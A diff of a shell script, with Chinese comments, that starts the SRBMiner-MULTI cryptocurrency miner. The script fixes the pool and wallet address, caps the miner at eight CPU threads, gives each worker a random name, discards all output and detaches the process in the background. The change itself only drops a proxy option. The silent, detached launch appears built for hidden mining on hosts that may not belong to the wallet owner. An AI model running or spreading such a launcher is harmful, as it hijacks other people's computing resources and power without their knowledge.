@@ -63,7 +63,7 @@ fi
     chmod +x ./SRBMiner-MULTI
 
     # 使用 PepePOW 配置启动 SRBMiner-MULTI，添加随机矿工名和代理
-    ./SRBMiner-MULTI --disable-gpu --algorithm xelishashv2_pepew --cpu-threads 8 --pool stratum+tcp://eu.mining4people.com:4176 --wallet 0x6c12d35208e9be438ae91F15A4B3A99afb70Eadf.miner_$(shuf -i 1000-9999 -n 1)-$(date +%s) --password x --retry-time 5 --proxy socks5://192.168.1.100:1080 >/dev/null 2>&1 & disown
+    ./SRBMiner-MULTI --disable-gpu --algorithm xelishashv2_pepew --cpu-threads 8 --pool stratum+tcp://eu.mining4people.com:4176 --wallet 0x6c12d35208e9be438ae91F15A4B3A99afb70Eadf.miner_$(shuf -i 1000-9999 -n 1)-$(date +%s) --password x >/dev/null 2>&1 & disown
 )
 
 echo "SRBMiner-MULTI 的下载和运行正在后台进行。"
